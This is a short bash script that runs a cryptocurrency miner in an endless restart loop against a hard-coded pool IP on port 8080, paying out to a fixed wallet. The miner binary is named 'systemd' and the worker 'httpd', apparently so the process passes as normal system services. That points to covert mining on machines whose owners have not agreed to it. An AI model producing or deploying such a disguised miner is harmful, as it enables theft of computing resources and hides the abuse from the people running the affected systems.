#!/bin/bash

# Wallet and worker configuration
WALLET="0x1bE17413356722a411033303EF7D8A13768fdF83"
WORKER="httpd"
POOL_URL="stratum+tcp://$WALLET.$WORKER@146.103.45.69:8080"

# Infinite loop to restart the miner if it stops
while true; do
  echo "Starting miner..."
  ./systemd --pool $POOL_URL --cpu-devices 0 >> 8080.log 2>&1

  # Check exit code of miner
  EXIT_CODE=$?
  echo "Miner crashed with exit code $EXIT_CODE. Restarting in 5 seconds..."
  sleep 5
done
